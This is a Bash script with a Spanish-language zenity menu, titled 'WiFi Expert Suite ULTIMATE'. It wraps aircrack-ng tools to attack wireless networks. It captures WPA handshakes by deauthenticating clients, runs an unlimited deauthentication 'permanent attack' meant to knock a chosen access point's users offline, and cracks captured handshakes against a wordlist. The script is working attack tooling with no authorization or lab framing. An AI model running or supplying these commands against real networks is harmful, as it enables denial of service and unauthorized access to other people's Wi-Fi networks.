#!/bin/bash
# WiFi Expert Suite v6.5 - ULTIMATE EDITION

while true; do
    CHOICE=$(zenity --list --title="📡 WiFi Expert Suite ULTIMATE" \
        --column="ID" --column="Acción" --width=600 --height=550 \
        1 "⚡ Activar Modo Monitor" \
        2 "🌐 Desactivar Modo Monitor" \
        3 "📡 Escaneo General" \
        4 "🔍 Rastreo Específico" \
        5 "🔑 Capturar Handshake" \
        6 "🔥 ATAQUE PERMANENTE (Bloqueo Total)" \
        7 "🔓 DESCIFRAR CLAVE (Cracking)" \
        8 "❌ Salir")

    case $CHOICE in
        # ... (Opciones 1 a 4 se mantienen igual)
        5)
            BSSID=$(zenity --entry --text="BSSID:")
            CANAL=$(zenity --entry --text="Canal:")
            FICHERO=$(zenity --entry --text="Nombre (sin extension):" --entry-text="captura")
            sudo iwconfig wlan0mon channel $CANAL
            gnome-terminal --title="CAPTURANDO" -- sh -c "sudo airodump-ng --bssid $BSSID -c $CANAL -w $FICHERO wlan0mon; exec bash" &
            sleep 2
            xterm -e "sudo aireplay-ng -0 20 -a $BSSID wlan0mon"
            ;;
        6)
            BSSID=$(zenity --entry --text="BSSID a Bloquear:")
            CANAL=$(zenity --entry --text="Canal:")
            sudo iwconfig wlan0mon channel $CANAL
            sudo aireplay-ng -0 0 -a $BSSID wlan0mon > /dev/null 2>&1 &
            ATAQUE_PID=$!
            zenity --question --title="ATAQUE ACTIVO" --text="Bloqueando $BSSID...\n¿Detener?"
            kill $ATAQUE_PID
            ;;
        7)
            # NUEVA FUNCIÓN: CRACKING
            CAP_FILE=$(zenity --file-selection --title="Selecciona el archivo .cap" --file-filter="*.cap")
            WORDLIST=$(zenity --file-selection --title="Selecciona tu diccionario (wordlist.txt)")
            
            gnome-terminal --title="CRACKING EN CURSO" -- sh -c "aircrack-ng -w $WORDLIST $CAP_FILE; echo 'Proceso terminado. Presiona Enter para salir'; read"
            ;;
        8) exit ;;
    esac
done
